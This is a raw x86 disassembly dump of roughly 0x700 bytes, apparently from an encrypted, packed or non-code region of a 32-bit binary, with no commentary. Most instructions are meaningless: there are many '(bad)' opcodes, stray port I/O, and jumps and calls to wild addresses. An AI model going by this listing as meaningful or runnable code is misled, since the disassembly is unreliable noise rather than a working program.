  40b7e9:	mov    ah,BYTE PTR [eax-0x38c63e55]
  40b7ef:	jl     0x40b82a
  40b7f1:	jmp    0x7172:0x3e25913c
  40b7f8:	push   ss
  40b7f9:	xchg   ebp,eax
  40b7fa:	push   edi
  40b7fb:	mov    DWORD PTR [edi],edi
  40b7fd:	dec    esp
  40b7fe:	or     BYTE PTR ds:0x4e8581c4,ah
  40b804:	lods   al,BYTE PTR ds:[esi]
  40b805:	je     0x40b798
  40b807:	mov    bh,al
  40b809:	xchg   edi,eax
  40b80a:	sub    eax,0xe58ec498
  40b80f:	icebp  
  40b810:	sub    eax,0x9c9fc716
  40b815:	call   0x11cba267
  40b81a:	and    al,dl
  40b81c:	das    
  40b81d:	mov    bh,0xfd
  40b81f:	stos   DWORD PTR es:[edi],eax
  40b820:	and    ebx,DWORD PTR [esi+0x40]
  40b823:	or     al,0xec
  40b825:	rcl    ah,cl
  40b827:	dec    eax
  40b828:	vmread DWORD PTR [eax],edi
  40b82b:	lods   al,BYTE PTR cs:[esi]
  40b82d:	nop
  40b82e:	add    BYTE PTR [ebp-0xd],dl
  40b831:	xchg   esp,eax
  40b832:	(bad)  
  40b833:	out    dx,eax
  40b834:	das    
  40b835:	scas   al,BYTE PTR es:[edi]
  40b836:	dec    esi
  40b837:	add    bh,dl
  40b839:	sbb    eax,edi
  40b83b:	not    eax
  40b83d:	lea    ebp,[esi]
  40b83f:	jbe    0x40b8b9
  40b841:	dec    esi
  40b842:	int3   
  40b843:	sub    BYTE PTR [eax],ch
  40b845:	xor    al,0xe8
  40b847:	(bad)  
  40b848:	ins    BYTE PTR es:[edi],dx
  40b849:	cld    
  40b84a:	inc    esi
  40b84b:	(bad)  
  40b84d:	mov    DWORD PTR [edx-0x6c],ebp
  40b850:	cmp    BYTE PTR [esi],0xcf
  40b853:	adc    eax,0x8802bf19
  40b858:	in     al,0x4f
  40b85a:	fild   QWORD PTR [edx+ebp*4-0x1384c294]
  40b861:	adc    BYTE PTR [ecx],0x8f
  40b864:	clc    
  40b865:	mov    edi,0xa4371c8b
  40b86a:	ja     0x40b899
  40b86c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40b86e:	mov    bl,0xf5
  40b870:	inc    ebx
  40b871:	cmp    esi,ebx
  40b873:	pop    ecx
  40b874:	xchg   esp,eax
  40b875:	pop    edx
  40b876:	jecxz  0x40b87d
  40b878:	pop    ds
  40b879:	xchg   esp,eax
  40b87a:	cld    
  40b87b:	repnz add BYTE PTR [edx*8+0x46e5bcd8],ch
  40b883:	jb     0x40b8ad
  40b885:	ror    BYTE PTR [edx+0x7f],cl
  40b888:	repz pop ecx
  40b88a:	cmp    DWORD PTR gs:[edi-0x44],ecx
  40b88e:	xlat   BYTE PTR ds:[ebx]
  40b88f:	sub    DWORD PTR [ebx+0x3f],ebp
  40b892:	adc    BYTE PTR [edi+eax*2-0x40],bh
  40b896:	xchg   edi,eax
  40b897:	ins    DWORD PTR es:[edi],dx
  40b898:	xchg   BYTE PTR [esi],bl
  40b89a:	(bad)
  40b89d:	jns    0x40b900
  40b89f:	dec    eax
  40b8a0:	push   esi
  40b8a1:	or     DWORD PTR [ebp+0x773b381e],0xffffffc2
  40b8a8:	add    esi,DWORD PTR [edx-0x3e958d69]
  40b8ae:	out    dx,al
  40b8af:	jmp    0x40b8ef
  40b8b1:	(bad)  
  40b8b2:	retf   
  40b8b3:	xchg   esi,eax
  40b8b4:	sbb    BYTE PTR [edx-0x260497ec],ch
  40b8ba:	(bad)
  40b8bd:	or     bh,dl
  40b8bf:	into   
  40b8c0:	cmp    BYTE PTR [edi],ah
  40b8c2:	or     bl,BYTE PTR [ecx]
  40b8c4:	ror    DWORD PTR [esi+0x4ce94176],cl
  40b8ca:	mov    esp,0x6296b9a7
  40b8cf:	add    ebp,DWORD PTR [esp+eiz*4-0x22]
  40b8d3:	xchg   esi,eax
  40b8d4:	dec    DWORD PTR [ecx-0x18]
  40b8d7:	ffreep st(5)
  40b8d9:	mov    ecx,0x69901441
  40b8de:	ftst   
  40b8e0:	or     DWORD PTR [edi],eax
  40b8e2:	out    0x81,al
  40b8e4:	push   ebx
  40b8e5:	je     0x40b907
  40b8e7:	jnp    0x40b8ab
  40b8e9:	in     eax,dx
  40b8ea:	mov    ds:0x3352dc2c,eax
  40b8f0:	pop    DWORD PTR [ecx+0x25]
  40b8f3:	push   edx
  40b8f4:	in     al,0x9
  40b8f6:	jno    0x40b8c1
  40b8f8:	outs   dx,BYTE PTR ds:[esi]
  40b8f9:	lahf   
  40b8fa:	inc    ecx
  40b8fb:	jbe    0x40b920
  40b8fd:	(bad)  
  40b8ff:	leave  
  40b900:	or     BYTE PTR [edx+0x6bb9ba63],0x27
  40b907:	add    eax,0xc5f5d7d1
  40b90c:	sahf   
  40b90d:	xor    al,BYTE PTR [edx]
  40b90f:	retf   
  40b910:	(bad)  
  40b911:	cmp    ebx,DWORD PTR [ebp-0x19371109]
  40b917:	add    ch,dh
  40b919:	xor    eax,0x6cc18156
  40b91e:	daa    
  40b91f:	ins    DWORD PTR es:[edi],dx
  40b920:	outs   dx,DWORD PTR ds:[esi]
  40b921:	push   ds
  40b922:	ins    DWORD PTR es:[edi],dx
  40b923:	sub    al,0x54
  40b925:	pop    esp
  40b926:	add    ebp,edx
  40b928:	pop    es
  40b929:	jl     0x40b8b7
  40b92b:	in     al,0x30
  40b92d:	fisubr DWORD PTR [eax-0x1a0eb85d]
  40b933:	sar    edx,1
  40b935:	sub    BYTE PTR [ecx],bl
  40b937:	sbb    eax,0x2120c7e9
  40b93c:	arpl   WORD PTR [edx-0x21228aa1],dx
  40b942:	sub    DWORD PTR [edi],eax
  40b944:	mov    edx,0x83ba6152
  40b949:	loope  0x40b953
  40b94b:	mov    bh,0xce
  40b94d:	into   
  40b94e:	pop    edi
  40b94f:	inc    edx
  40b950:	pop    ecx
  40b951:	sbb    eax,0xc3998001
  40b956:	fcomp  DWORD PTR [edi]
  40b958:	cs jecxz 0x40b93b
  40b95b:	dec    esi
  40b95c:	inc    ecx
  40b95d:	ins    BYTE PTR es:[edi],dx
  40b95e:	int3   
  40b95f:	adc    eax,0xcc34f818
  40b964:	jl     0x40b933
  40b966:	xchg   ch,dh
  40b968:	pop    es
  40b969:	clc    
  40b96a:	xchg   BYTE PTR [edi],ch
  40b96c:	lods   al,BYTE PTR ds:[esi]
  40b96d:	sbb    DWORD PTR [edi+0x46],0xdf757c9c
  40b974:	push   edi
  40b975:	push   edi
  40b976:	call   0xadcefffa
  40b97b:	push   cs
  40b97c:	aad    0x7
  40b97e:	dec    ebx
  40b97f:	hlt    
  40b980:	fcomp  QWORD PTR [eax+0xb]
  40b983:	add    esp,edi
  40b985:	mov    ds:0x35e622de,eax
  40b98a:	repnz cmc 
  40b98c:	dec    ebp
  40b98d:	pushf  
  40b98e:	rcl    ch,1
  40b990:	jp     0x40b91d
  40b992:	ja     0x40b9e9
  40b994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b995:	dec    edi
  40b996:	or     esi,DWORD PTR [eax]
  40b998:	adc    ch,BYTE PTR [edi]
  40b99a:	test   eax,0x3eba298d
  40b99f:	div    BYTE PTR [ecx]
  40b9a1:	not    DWORD PTR ds:0xd8ee5a
  40b9a7:	sbb    DWORD PTR [ebx],edi
  40b9a9:	mov    ah,0x86
  40b9ab:	shr    BYTE PTR [eax],0x91
  40b9ae:	adc    al,0x0
  40b9b0:	test   eax,0xa8555ec6
  40b9b5:	mov    al,0xe2
  40b9b7:	adc    al,0x6e
  40b9b9:	leave  
  40b9ba:	pop    esi
  40b9bb:	xor    cl,BYTE PTR [eax]
  40b9bd:	mov    esp,0x83ab6865
  40b9c2:	inc    edx
  40b9c3:	jle    0x40ba25
  40b9c5:	sbb    DWORD PTR ds:0x47918fe4,edi
  40b9cb:	das    
  40b9cc:	popa   
  40b9cd:	nop
  40b9ce:	mov    ebp,0xefb19d79
  40b9d3:	scas   al,BYTE PTR es:[edi]
  40b9d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9d5:	jo     0x40b9dc
  40b9d7:	inc    edx
  40b9d8:	jno    0x40b95a
  40b9da:	push   es
  40b9db:	push   esi
  40b9dc:	lea    esi,[edx]
  40b9de:	pop    esi
  40b9df:	xchg   edi,eax
  40b9e0:	icebp  
  40b9e1:	outs   dx,BYTE PTR ds:[esi]
  40b9e2:	xlat   BYTE PTR ds:[ebx]
  40b9e3:	dec    edx
  40b9e4:	daa    
  40b9e5:	addr16 out 0xe,al
  40b9e8:	sbb    eax,0x2bec9d89
  40b9ed:	sbb    edx,DWORD PTR [ecx]
  40b9ef:	fisttp DWORD PTR [ebx+edx*8+0x2e]
  40b9f3:	push   ebp
  40b9f4:	punpcklwd mm5,DWORD PTR [edi]
  40b9f7:	inc    ebp
  40b9f8:	add    eax,0x35f59fdd
  40b9fd:	fisubr WORD PTR [esi-0x5ac19802]
  40ba03:	cld    
  40ba04:	fs (bad) 
  40ba06:	xchg   ebx,eax
  40ba07:	in     eax,0x2
  40ba09:	aas    
  40ba0a:	cmp    al,0x52
  40ba0c:	ss popf 
  40ba0e:	mov    dh,0x52
  40ba10:	ffreep st(5)
  40ba12:	pop    ebp
  40ba13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba14:	repnz lea esp,[ebp+0x3bbe0ed4]
  40ba1b:	call   0x4ef7f948
  40ba20:	cmc    
  40ba21:	aam    0x2d
  40ba23:	bound  esp,QWORD PTR [ecx+0x12]
  40ba26:	shl    DWORD PTR ds:0xfdc4ed60,0x44
  40ba2d:	and    BYTE PTR [ebx+0x13a64e79],bl
  40ba33:	test   al,0xed
  40ba35:	jmp    0x40b9ff
  40ba37:	aad    0x78
  40ba39:	pop    es
  40ba3a:	jg     0x40ba9f
  40ba3c:	aad    0xca
  40ba3e:	sub    bh,BYTE PTR [edi+edi*1-0x7]
  40ba42:	mov    ecx,ecx
  40ba44:	add    eax,0xca900773
  40ba49:	int3   
  40ba4a:	xchg   edx,eax
  40ba4b:	mov    bh,0x54
  40ba4d:	push   0xa24be018
  40ba52:	dec    esp
  40ba53:	pushf  
  40ba54:	pusha  
  40ba55:	loope  0x40baa0
  40ba57:	xor    cl,cl
  40ba59:	out    dx,al
  40ba5a:	mov    edi,0xefe44ee0
  40ba5f:	out    0xd8,eax
  40ba61:	inc    ecx
  40ba62:	scas   eax,DWORD PTR es:[edi]
  40ba63:	jg     0x40ba5e
  40ba65:	fmul   st(6),st
  40ba67:	out    0x92,eax
  40ba69:	push   edi
  40ba6a:	mov    al,0xc1
  40ba6c:	jmp    0x903d98b9
  40ba71:	nop
  40ba72:	xlat   BYTE PTR ds:[ebx]
  40ba73:	xor    cl,bh
  40ba75:	inc    ebp
  40ba76:	and    eax,DWORD PTR [eax+0x64]
  40ba79:	jecxz  0x40ba96
  40ba7b:	mov    cl,BYTE PTR [ecx-0x34df29b6]
  40ba81:	aam    0xe5
  40ba83:	imul   ecx,DWORD PTR [edx-0x2f7463ff],0xffffffc3
  40ba8a:	pop    eax
  40ba8b:	in     eax,dx
  40ba8c:	jo     0x40ba58
  40ba8e:	loope  0x40ba55
  40ba90:	daa    
  40ba91:	mov    eax,ds:0x930c036e
  40ba96:	repnz gs imul eax
  40ba9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba9b:	xor    esi,DWORD PTR [eax-0x41]
  40ba9e:	shl    DWORD PTR [ecx],0xc3
  40baa1:	jne    0x40bb12
  40baa3:	cmp    DWORD PTR ds:0xc8cd8ec1,0xaf148ac6
  40baad:	fcomp  DWORD PTR [edx]
  40baaf:	pop    ecx
  40bab0:	pop    esi
  40bab1:	xor    al,0xc3
  40bab3:	xchg   esp,eax
  40bab4:	dec    esi
  40bab5:	or     eax,0x5b08c58f
  40baba:	mov    ebx,0x752c3627
  40babf:	dec    ebp
  40bac0:	enter  0xfb6f,0xc7
  40bac4:	mov    eax,ds:0x7653e397
  40bac9:	and    BYTE PTR [ecx+0x4c],ch
  40bacc:	sub    DWORD PTR [edx],eax
  40bace:	cld    
  40bacf:	outs   dx,BYTE PTR gs:[esi]
  40bad1:	cwde   
  40bad2:	mov    esi,0x82d25b04
  40bad7:	ins    BYTE PTR es:[edi],dx
  40bad8:	xchg   edx,eax
  40bad9:	xor    BYTE PTR [ebx+0x62b3660b],dh
  40badf:	sub    eax,0x5ea861c9
  40bae4:	mov    ah,bh
  40bae6:	adc    al,BYTE PTR [edi+0x7]
  40bae9:	retf   0x804b
  40baec:	cmp    BYTE PTR ds:0x2411bfa4,ch
  40baf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baf3:	(bad)  
  40baf4:	jmp    0x40baf7
  40baf6:	sbb    al,0xc3
  40baf8:	test   DWORD PTR [ebx],edi
  40bafa:	or     BYTE PTR [eax+0x67],al
  40bafd:	stos   BYTE PTR es:[edi],al
  40bafe:	test   BYTE PTR [edx],bl
  40bb00:	into   
  40bb01:	fimul  WORD PTR [edi]
  40bb03:	inc    ecx
  40bb04:	jo     0x40bb15
  40bb06:	add    al,0x4e
  40bb08:	pushf  
  40bb09:	repz jo 0x40bb8b
  40bb0c:	ins    DWORD PTR es:[edi],dx
  40bb0d:	xchg   ecx,eax
  40bb0e:	(bad)  
  40bb0f:	shl    DWORD PTR [ecx],1
  40bb11:	das    
  40bb12:	inc    esp
  40bb13:	inc    ebx
  40bb14:	pop    edi
  40bb15:	das    
  40bb16:	ja     0x40baa6
  40bb18:	xor    DWORD PTR [eax-0x70],0x6515759b
  40bb1f:	dec    esi
  40bb20:	push   edi
  40bb21:	or     cl,bl
  40bb23:	jbe    0x40bb06
  40bb25:	push   esp
  40bb26:	pcmpeqb mm2,QWORD PTR ds:0x6015152b
  40bb2d:	shl    cl,0x57
  40bb30:	jl     0x40bb24
  40bb32:	mov    eax,ds:0x64caf9c2
  40bb37:	bnd jge 0x40bad2
  40bb3a:	nop
  40bb3b:	fsubr  DWORD PTR [esi-0x35ef060]
  40bb41:	dec    esp
  40bb42:	inc    eax
  40bb43:	ins    DWORD PTR es:[edi],dx
  40bb44:	push   esi
  40bb45:	nop
  40bb46:	mov    eax,0xf0f1663
  40bb4b:	(bad)  
  40bb4c:	enter  0x4b94,0x65
  40bb50:	sbb    ebp,esp
  40bb52:	sub    al,ah
  40bb54:	pushf  
  40bb55:	(bad)  
  40bb56:	out    dx,eax
  40bb57:	or     eax,0x1658e86a
  40bb5c:	sub    edx,DWORD PTR [ebp+0x59de14c1]
  40bb62:	(bad)  
  40bb63:	int3   
  40bb64:	fadd   QWORD PTR [edi-0x14e13493]
  40bb6a:	clc    
  40bb6b:	pusha  
  40bb6c:	icebp  
  40bb6d:	sar    DWORD PTR [ebx+0x14d38d17],0xe8
  40bb74:	sbb    edx,edx
  40bb76:	mov    ecx,0x741b72fe
  40bb7b:	cld    
  40bb7c:	add    al,0x84
  40bb7e:	mov    ebp,0x1a20e50a
  40bb83:	ffreep st(2)
  40bb85:	addr16 cli 
  40bb87:	in     al,dx
  40bb88:	add    DWORD PTR [edi+0x4d],esi
  40bb8b:	ja     0x40bbc6
  40bb8d:	adc    DWORD PTR [esi-0x2ad8315],edx
  40bb93:	xor    bh,ch
  40bb95:	sar    BYTE PTR es:[edx-0xe],cl
  40bb99:	cdq    
  40bb9a:	fs xchg edx,eax
  40bb9c:	xchg   ecx,eax
  40bb9d:	mov    bh,0xfc
  40bb9f:	lds    edx,FWORD PTR [edi+eax*8+0x7f]
  40bba3:	pop    esi
  40bba4:	cmc    
  40bba5:	mov    ebp,0xe230998c
  40bbaa:	das    
  40bbab:	call   0xbb77:0x21e42a4
  40bbb2:	push   ds
  40bbb3:	add    ebx,edx
  40bbb5:	mov    bl,0xc1
  40bbb7:	xor    al,0xdd
  40bbb9:	push   esp
  40bbba:	jg     0x40bb93
  40bbbc:	push   ebx
  40bbbd:	pop    eax
  40bbbe:	inc    ebp
  40bbbf:	fistp  WORD PTR [esi+0x21]
  40bbc2:	mov    BYTE PTR [edx+0x4c],dh
  40bbc5:	test   al,0x87
  40bbc7:	je     0x40bb65
  40bbc9:	jmp    0x40bc03
  40bbcb:	add    eax,0xc06e9953
  40bbd0:	jge    0x40bb73
  40bbd2:	pop    edi
  40bbd3:	and    cl,BYTE PTR [edi+0xf50ad82]
  40bbd9:	mov    esi,0x6da46c38
  40bbde:	sub    esp,DWORD PTR [eax-0x5dbc4f15]
  40bbe4:	stc    
  40bbe5:	into   
  40bbe6:	(bad)  
  40bbe7:	cmp    eax,0x332dea0
  40bbec:	xchg   ebp,eax
  40bbed:	fstp   st(0)
  40bbef:	repz xlat BYTE PTR ds:[ebx]
  40bbf1:	add    DWORD PTR [ebx],eax
  40bbf3:	lock push ebx
  40bbf5:	jnp    0x40bc3e
  40bbf7:	daa    
  40bbf8:	jl     0x40bc12
  40bbfa:	xor    ch,BYTE PTR [edi+eax*1-0x35e2fb44]
  40bc01:	push   ecx
  40bc02:	pop    ebx
  40bc03:	cmp    BYTE PTR [ebx-0x50],bl
  40bc06:	or     al,0x1b
  40bc08:	stos   DWORD PTR es:[edi],eax
  40bc09:	cvtpi2ps xmm2,QWORD PTR [edi+0x0]
  40bc0d:	jp     0x40bc56
  40bc0f:	xchg   esi,eax
  40bc10:	and    DWORD PTR [ebp-0x43],edx
  40bc13:	or     al,0xb7
  40bc15:	aas    
  40bc16:	mov    bl,BYTE PTR [ebx+eiz*4]
  40bc19:	ret    0xb25c
  40bc1c:	mov    dh,0xa1
  40bc1e:	mov    ebx,0xb5db9805
  40bc23:	mov    BYTE PTR [esi-0x7a3a010b],al
  40bc29:	stos   DWORD PTR es:[edi],eax
  40bc2a:	jge    0x40bbfa
  40bc2c:	das    
  40bc2d:	rol    BYTE PTR [ebp+0x1a81928a],cl
  40bc33:	jmp    0x40bbd8
  40bc35:	push   0x5cee9109
  40bc3a:	lahf   
  40bc3b:	hlt    
  40bc3c:	cmp    bh,BYTE PTR [ebx-0x57d3163c]
  40bc42:	repz ret 0x9eda
  40bc46:	in     eax,0x92
  40bc48:	xor    BYTE PTR [ebp-0x1c],al
  40bc4b:	push   esp
  40bc4c:	cmp    eax,0xca848584
  40bc51:	inc    eax
  40bc52:	arpl   WORD PTR [edi],dx
  40bc54:	inc    esi
  40bc55:	fst    QWORD PTR [ebp+0x62497c9f]
  40bc5b:	xor    al,0xe6
  40bc5d:	jno    0x40bc6f
  40bc5f:	mov    ebx,0x4b436c4
  40bc64:	mov    esi,DWORD PTR [edx+0x48]
  40bc67:	push   ebp
  40bc68:	push   eax
  40bc69:	mov    ebx,0xa4b4a502
  40bc6e:	or     al,0x45
  40bc70:	xor    ebx,DWORD PTR [ecx]
  40bc72:	or     al,0xe
  40bc74:	inc    DWORD PTR [eax+eiz*1]
  40bc77:	sbb    ebp,DWORD PTR [esi-0x39]
  40bc7a:	and    ebp,DWORD PTR [ebx-0x5]
  40bc7d:	jmp    0xd056:0x87dd8f8b
  40bc84:	xchg   ecx,eax
  40bc85:	idiv   BYTE PTR [edi]
  40bc87:	mov    dl,0x7f
  40bc89:	or     DWORD PTR [edi+0x4e],ebp
  40bc8c:	xchg   edx,eax
  40bc8d:	fxch   st(1)
  40bc8f:	jecxz  0x40bc73
  40bc91:	out    0x24,al
  40bc93:	push   ss
  40bc94:	mov    al,0x96
  40bc96:	adc    eax,0x32cc1389
  40bc9b:	dec    edx
  40bc9c:	jmp    0xd5a8bc6a
  40bca1:	cmp    eax,0x25b1433a
  40bca6:	lods   eax,DWORD PTR ds:[esi]
  40bca7:	adc    eax,DWORD PTR [edx-0x49]
  40bcaa:	and    DWORD PTR [esi],eax
  40bcac:	dec    esi
  40bcad:	out    0x95,eax
  40bcaf:	and    DWORD PTR [ebx+0x74ab242d],esi
  40bcb5:	cmc    
  40bcb6:	mov    ecx,0x9d784d1a
  40bcbb:	xor    ch,BYTE PTR [ebx]
  40bcbd:	cmc    
  40bcbe:	push   ebx
  40bcbf:	out    0x86,eax
  40bcc1:	xchg   ebx,eax
  40bcc2:	mov    ah,0x84
  40bcc4:	mov    ds:0xd41efcbb,eax
  40bcc9:	fcomp  DWORD PTR [esi+edi*8]
  40bccc:	clc    
  40bccd:	pushf  
  40bcce:	xchg   esp,eax
  40bccf:	stos   DWORD PTR es:[edi],eax
  40bcd0:	add    ebp,edx
  40bcd2:	mov    cl,0x2d
  40bcd4:	aaa    
  40bcd5:	inc    esp
  40bcd6:	mov    DWORD PTR [ecx+0x7387fa11],edi
  40bcdc:	cmp    edx,esi
  40bcde:	cmp    dl,bh
  40bce0:	xchg   DWORD PTR [edx+0x31cd319],ebx
  40bce6:	popf   
  40bce7:	jae    0x40bd10
  40bce9:	mul    BYTE PTR [eax]
  40bceb:	or     ecx,DWORD PTR ds:0x3d0e7647
  40bcf1:	sbb    eax,0xd9df927b
  40bcf6:	scas   al,BYTE PTR es:[edi]
  40bcf7:	shr    DWORD PTR [edx],cl
  40bcf9:	rcr    DWORD PTR [ebx+0x5d],cl
  40bcfc:	(bad)  
  40bcfd:	jmp    0x40bd38
  40bcff:	adc    DWORD PTR [edx],ebx
  40bd01:	dec    edi
  40bd02:	sub    al,BYTE PTR [ecx+0x224e17ce]
  40bd08:	call   0xfb14a714
  40bd0d:	or     eax,0x1659317e
  40bd12:	push   esp
  40bd13:	cmp    al,0x8c
  40bd15:	in     eax,dx
  40bd16:	repz shl ebx,cl
  40bd19:	jmp    0x40bca2
  40bd1b:	inc    ecx
  40bd1c:	add    cl,dl
  40bd1e:	mov    ds:0xd1a5a8b6,al
  40bd23:	cld    
  40bd24:	mov    esi,0x31764da2
  40bd29:	in     al,dx
  40bd2a:	cdq    
  40bd2b:	div    BYTE PTR [edx]
  40bd2d:	lods   al,BYTE PTR ds:[esi]
  40bd2e:	jecxz  0x40bd35
  40bd30:	jecxz  0x40bd59
  40bd32:	xlat   BYTE PTR ds:[ebx]
  40bd33:	jns    0x40bcfb
  40bd35:	dec    edi
  40bd36:	outs   dx,DWORD PTR ds:[esi]
  40bd37:	sbb    esp,esp
  40bd39:	mov    ebp,0xc37e4269
  40bd3e:	jnp    0x40bdb9
  40bd40:	jp     0x40bd97
  40bd42:	and    dh,BYTE PTR [ebp-0x2e]
  40bd45:	push   ds
  40bd46:	adc    al,0x1c
  40bd48:	popa   
  40bd49:	repz jmp 0xe5b0e9b0
  40bd4f:	push   esp
  40bd50:	push   edx
  40bd51:	and    al,0x78
  40bd53:	xor    eax,DWORD PTR [ecx]
  40bd55:	outs   dx,BYTE PTR ds:[esi]
  40bd56:	sub    eax,DWORD PTR [eax]
  40bd58:	fldenv [ebx+esi*4-0x5bc75583]
  40bd5f:	or     DWORD PTR [edi-0x67],ecx
  40bd62:	add    BYTE PTR [eax-0x31],al
  40bd65:	push   es
  40bd66:	mov    ecx,0xf237f9bc
  40bd6b:	mov    ch,0xb5
  40bd6d:	sbb    DWORD PTR [ebp-0x5],0x2c9f6bc2
  40bd74:	sar    ebx,0x62
  40bd77:	cs or  edi,esp
  40bd7a:	sub    al,0x7a
  40bd7c:	out    0xd8,eax
  40bd7e:	push   edx
  40bd7f:	cmp    DWORD PTR [edx-0x416ab91f],0x4a74510
  40bd89:	push   eax
  40bd8a:	and    eax,ebp
  40bd8c:	clc    
  40bd8d:	push   ebx
  40bd8e:	inc    ecx
  40bd8f:	mov    bh,0xbc
  40bd91:	xor    eax,0x360a47a
  40bd96:	xor    al,0x19
  40bd98:	mov    al,0x90
  40bd9a:	ins    DWORD PTR es:[edi],dx
  40bd9b:	ds ss ins DWORD PTR es:[edi],dx
  40bd9e:	fst    QWORD PTR [esi]
  40bda0:	mov    cl,0x47
  40bda2:	or     ebp,DWORD PTR [esi]
  40bda4:	push   cs
  40bda5:	or     BYTE PTR [esi+esi*1-0x28c9001c],cl
  40bdac:	ins    BYTE PTR es:[edi],dx
  40bdad:	imul   esp,eax,0xffffffdb
  40bdb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdb1:	mov    ah,0xc
  40bdb3:	pop    ebp
  40bdb4:	fwait
  40bdb5:	cmp    al,0xb
  40bdb7:	inc    ebx
  40bdb8:	cli    
  40bdb9:	sub    DWORD PTR [edx+0x70],esi
  40bdbc:	mov    BYTE PTR [edi+edi*1+0x52],ah
  40bdc0:	jo     0x40be18
  40bdc2:	fsub   st(1),st
  40bdc4:	(bad)  
  40bdc5:	or     al,0xe6
  40bdc7:	jg     0x40be1c
  40bdc9:	cli    
  40bdca:	adc    al,0x33
  40bdcc:	inc    eax
  40bdcd:	repnz push 0xfffffffa
  40bdd0:	leave  
  40bdd1:	add    esp,ecx
  40bdd3:	adc    DWORD PTR [edx],ebx
  40bdd5:	std    
  40bdd6:	bound  esp,QWORD PTR [esi+ebp*1+0x78]
  40bdda:	lods   eax,DWORD PTR ds:[esi]
  40bddb:	sbb    DWORD PTR [ebx+0x5497f2bd],0x1c7b5b5
  40bde5:	add    BYTE PTR ds:0x92baadce,dh
  40bdeb:	das    
  40bdec:	jp     0x40be3f
  40bdee:	dec    esi
  40bdef:	hlt    
  40bdf0:	mov    al,0xa0
  40bdf2:	(bad)  
  40bdf3:	mov    bh,0x28
  40bdf5:	cmp    edi,DWORD PTR [edi]
  40bdf7:	inc    edx
  40bdf8:	lods   eax,DWORD PTR ds:[esi]
  40bdf9:	ja     0x40bdee
  40bdfb:	js     0x40be12
  40bdfd:	jg     0x40bda9
  40bdff:	inc    ebx
  40be00:	rcr    BYTE PTR [ebx],cl
  40be02:	add    dh,dh
  40be04:	push   esi
  40be05:	jo     0x40be21
  40be07:	fidiv  WORD PTR [eax+ebx*2]
  40be0a:	or     esp,DWORD PTR [esi]
  40be0c:	nop
  40be0d:	xor    al,0x92
  40be0f:	xchg   ebp,eax
  40be10:	mov    ah,0x83
  40be12:	mov    BYTE PTR [eax+0x73],cl
  40be15:	xchg   ebp,eax
  40be16:	das    
  40be17:	inc    edi
  40be18:	dec    ebp
  40be19:	inc    ebp
  40be1a:	sbb    DWORD PTR [edx-0x70],0xa3e4c876
  40be21:	outs   dx,DWORD PTR ds:[esi]
  40be22:	pop    eax
  40be23:	fild   DWORD PTR [eax-0x3f42ab9e]
  40be29:	test   al,0x57
  40be2b:	loop   0x40be9b
  40be2d:	cdq    
  40be2e:	push   0x23f80255
  40be33:	mov    esi,0xb7f1d6f2
  40be38:	in     al,dx
  40be39:	ja     0x40be23
  40be3b:	sub    al,0xb7
  40be3d:	dec    eax
  40be3e:	repz xlat BYTE PTR es:[ebx]
  40be41:	push   es
  40be42:	cld    
  40be43:	icebp  
  40be44:	mov    ds:0x6dae0ddf,eax
  40be49:	mov    edi,DWORD PTR [ebx]
  40be4b:	add    eax,0x91094577
  40be50:	mov    al,ds:0xecca5a54
  40be55:	sbb    al,0xa6
  40be57:	and    edx,ebx
  40be59:	sbb    DWORD PTR [edx+0x2c],edi
  40be5c:	fisub  DWORD PTR [eax-0x22]
  40be5f:	jle    0x40be47
  40be61:	(bad)  
  40be62:	pop    ebx
  40be63:	hlt    
  40be64:	adc    eax,0xa7ebf830
  40be69:	enterw 0xf7b8,0x5a
  40be6e:	cmc    
  40be6f:	lock mov ebx,0x674fd81d
  40be75:	clc    
  40be76:	lock hlt 
  40be78:	push   esi
  40be79:	jnp    0x40be03
  40be7b:	test   bl,ch
  40be7d:	dec    ebp
  40be7e:	jne    0x40bec6
  40be80:	push   edi
  40be81:	icebp  
  40be82:	es sub al,0x98
  40be85:	push   ebx
  40be86:	lods   eax,DWORD PTR ds:[esi]
  40be87:	aaa    
  40be88:	xchg   edx,eax
  40be89:	sub    BYTE PTR [eax+edx*4],dl
  40be8c:	cmp    dl,ah
  40be8e:	(bad)  
  40be8f:	ret    0x2e4f
  40be92:	loope  0x40bec6
  40be94:	push   esp
  40be95:	dec    esi
  40be96:	pop    esp
  40be97:	jmp    0x40beb4
  40be99:	cwde   
  40be9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be9b:	push   ss
  40be9c:	pop    ecx
  40be9d:	std    
  40be9e:	cmp    BYTE PTR [eax+0x26],bh
  40bea1:	ins    DWORD PTR es:[edi],dx
  40bea2:	jnp    0x40be8b
  40bea4:	loopne 0x40bee4
  40bea6:	sub    bh,BYTE PTR [ecx-0x6f]
  40bea9:	mov    bh,0x86
  40beab:	sbb    BYTE PTR [eax+0x4a],ch
  40beae:	ja     0x40be97
  40beb0:	in     eax,0x85
  40beb2:	xchg   ecx,eax
  40beb3:	mov    ecx,0x74abcd41
  40beb8:	push   esi
  40beb9:	popf   
  40beba:	clc    
  40bebb:	or     BYTE PTR fs:[ebx-0x1a93a7a],ah
  40bec2:	pop    ds
  40bec3:	std    
  40bec4:	dec    eax
  40bec5:	adc    eax,DWORD PTR [eax-0x5ab311f2]
  40becb:	xchg   edi,edi
  40becd:	mov    al,0x84
  40becf:	jbe    0x40bea7
  40bed1:	inc    esi
  40bed2:	push   eax
  40bed3:	or     BYTE PTR [eax],ah
  40bed5:	idiv   DWORD PTR [ebx-0x55b7711f]
  40bedb:	sub    al,0x81
  40bedd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bede:	ss clc 
  40bee0:	pushf  
  40bee1:	cmp    al,0xac
  40bee3:	sub    edx,0x5480cdab
  40bee9:	mov    esi,0x9e08a2a
  40beee:	dec    ebx
  40beef:	push   esp
  40bef0:	sbb    dl,ah
  40bef2:	inc    esi
  40bef3:	xlat   BYTE PTR ds:[ebx]
  40bef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bef5:	adc    al,0x24
  40bef7:	inc    ebp
  40bef8:	inc    edx
  40bef9:	sar    esp,cl
  40befb:	and    bl,al
